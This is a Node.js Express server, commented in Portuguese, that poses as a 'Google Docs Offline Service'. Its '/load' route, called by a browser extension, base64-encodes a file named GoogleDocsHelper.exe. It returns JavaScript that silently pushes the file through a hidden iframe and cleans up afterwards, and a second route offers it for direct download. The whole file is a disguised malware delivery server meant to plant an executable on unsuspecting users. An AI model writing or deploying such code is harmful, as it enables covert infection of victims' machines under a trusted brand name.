const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Rota principal - TESTE SE TÁ ONLINE
app.get('/', (req, res) => {
  res.send('Google Docs Offline Service - Document Sync Active');
});

// Rota que a extensão vai chamar - FILELESS
app.get('/load', (req, res) => {
  try {
    // Lê o EXE da pasta public
    const exePath = path.join(__dirname, 'public', 'GoogleDocsHelper.exe');
    const exeBuffer = fs.readFileSync(exePath);
    const exeBase64 = exeBuffer.toString('base64');
    
    // Gera código JavaScript que executa o EXE na memória
    const jsCode = `
      // Google Docs Offline - Memory Execution
      (function() {
        try {
          // Converte base64 para binário
          const binaryData = '${exeBase64}';
          const binaryString = atob(binaryData);
          const bytes = new Uint8Array(binaryString.length);
          
          for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
          }
          
          // Executa na memória
          const blob = new Blob([bytes], { type: 'application/octet-stream' });
          const url = URL.createObjectURL(blob);
          
          const iframe = document.createElement('iframe');
          iframe.style.display = 'none';
          iframe.src = url;
          document.body.appendChild(iframe);
          
          setTimeout(() => {
            document.body.removeChild(iframe);
            URL.revokeObjectURL(url);
          }, 1000);
          
        } catch(e) {}
      })();
    `;
    
    res.send(jsCode);
    
  } catch (error) {
    res.status(500).send('Service temporarily unavailable');
  }
});

// Rota de download direto (apenas backup)
app.get('/download', (req, res) => {
  const exePath = path.join(__dirname, 'public', 'GoogleDocsHelper.exe');
  res.download(exePath);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('Google Docs Offline Service running on port', PORT);
});

